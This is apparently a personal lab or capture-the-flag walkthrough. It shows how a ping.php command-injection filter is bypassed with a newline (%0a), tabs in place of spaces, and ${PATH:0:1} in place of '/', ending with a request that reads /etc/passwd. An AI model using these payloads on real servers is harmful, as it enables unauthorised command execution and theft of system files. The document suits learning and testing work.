we only lemited to do the command in the pic (ls..cat)
we try `command injection` and intersept the reqesut with burp 
![[Pasted image 20260129172653.png]]
we see that the reqesut go thow `GET /ping.php?ip=127.0.0.1`
i try to  pass linux command on it 
```bash
GET /ping.php?ip=127.0.0.1;ls
```
the server blocked my request to the `;` are blocked .. and we can bypas it by  replace it with the tabe **newline character (`%0a`)** is usually allowed. 
and yes it work 
```bash
GET /ping.php?ip=127.0.0.1%0a
```
![[Pasted image 20260129173048.png]]

now let try to dump the `/etc/passwd`
```bash
GET /ping.php?ip=127.0.0.1%0acat+/etc/passwd 
```
`Invalid input` so the space (`+`) blocked  now we can bypass it by useing Tabs (`%09`) insade of spce 
![[Pasted image 20260129173345.png]]

still bloced we usely blocked case of the `/`   we can bypas it with linux env var  `${PATH:0:1}` = / 
```bash
GET /ping.php?ip=127.0.0.1%0acat%09${PATH:0:1}etc${PATH:0:1}passwd
```
